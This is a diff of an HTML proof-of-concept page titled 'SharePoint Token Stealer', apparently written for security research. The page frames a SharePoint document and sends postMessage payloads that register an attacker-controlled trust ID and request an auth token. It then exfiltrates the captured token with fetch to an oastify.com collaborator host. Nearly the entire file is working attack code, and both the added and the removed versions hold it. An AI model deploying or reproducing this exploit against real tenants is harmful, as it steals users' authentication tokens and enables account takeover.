@@ -1,37 +1,60 @@
+<!DOCTYPE html>
 <html>
-    <h1>POC</h1>
+<head>
+    <title>SharePoint PoC</title>
+</head>
+<body>
+    <h1>SharePoint Token Stealer</h1>
+    
+    <!-- THE TARGET IFRAME -->
+    <iframe id="sharepoint-frame" 
+            src="https://shiscolinotests-my.sharepoint.com/:w:/r/personal/shiscolino_shiscolinotests_onmicrosoft_com/_layouts/15/doc2.aspx?sourcedoc=%7BAAFD58B8-F1A2-439E-94F0-D4AC217EEA09%7D&action=default" 
+            style="width:100%; height:500px;">
+    </iframe>
+
+    <script>
+        // Malicious Page Script
+        const targetOrigin = "https://shiscolinotests-my.sharepoint.com";
+        const exploitId = "HACKER_ID";
+        
+        // Wait for iframe to load
+        const iframe = document.getElementById("sharepoint-frame");
+        
+        iframe.onload = function() {
+            const targetWindow = iframe.contentWindow;
+            console.log("Iframe loaded, starting exploit...");
+
+            // 1. Register Malicious Origin as Trusted
+            const registerPayload = JSON.stringify({
+                MessageId: "AddinTrustedOrigin",
+                AddinTrustId: exploitId
+            });
+            targetWindow.postMessage(registerPayload, targetOrigin);
+            console.log("Sent registration");
+
+            // 2. Request Auth Token (after short delay)
+            setTimeout(() => {
+                const tokenPayload = {
+                    MessageId: "GetAuthToken",
+                    AddinTrustId: exploitId,
+                    Resource: window.location.origin 
+                };
+                targetWindow.postMessage(tokenPayload, targetOrigin);
+                console.log("Sent token request");
+            }, 2000);
+        };
+
+        // 3. Capture & Exfiltrate Token
+        window.addEventListener("message", (event) => {
+            if (event.data && event.data.MessageId === "GetAuthTokenResponse") {
+                const token = event.data.Token;
+                console.log("STOLEN TOKEN:", token);
+                
+                // EXFILTRATION
+                fetch('https://cm237ixc7usjxquw38ghh91krbx2ls9h.oastify.com/?stolen_token=' + encodeURIComponent(token), { mode: 'no-cors' });
+                alert("Token stolen! Check console/collaborator.");
+            }
+        });
+    </script>
+</body>
 </html>
-<script>
-    // Malicious Page Script
-const targetOrigin = "https://shiscolinotests-my.sharepoint.com";
-const targetWindow = document.getElementById("sharepoint-frame").contentWindow;
-const exploitId = "HACKER_ID";
-
-// 1. Register Malicious Origin as Trusted
-const registerPayload = JSON.stringify({
-    MessageId: "AddinTrustedOrigin",
-    AddinTrustId: exploitId
-});
-targetWindow.postMessage(registerPayload, targetOrigin);
-
-// 2. Request Auth Token (after short delay)
-setTimeout(() => {
-    const tokenPayload = {
-        MessageId: "GetAuthToken",
-        AddinTrustId: exploitId,
-        Resource: window.location.origin // The attacker's origin vs the registered one
-    };
-    // Send as object and string to cover both parsing cases
-    targetWindow.postMessage(tokenPayload, targetOrigin);
-}, 1000);
-
-// 3. Capture & Exfiltrate Token
-window.addEventListener("message", (event) => {
-    if (event.data && event.data.MessageId === "GetAuthTokenResponse") {
-        const token = event.data.Token;
-        // EXFILTRATION: Send token to your Collaborator
-        fetch('https://cm237ixc7usjxquw38ghh91krbx2ls9h.oastify.com/?stolen_token=' + encodeURIComponent(token), { mode: 'no-cors' });
-    }
-});
-
-</script>
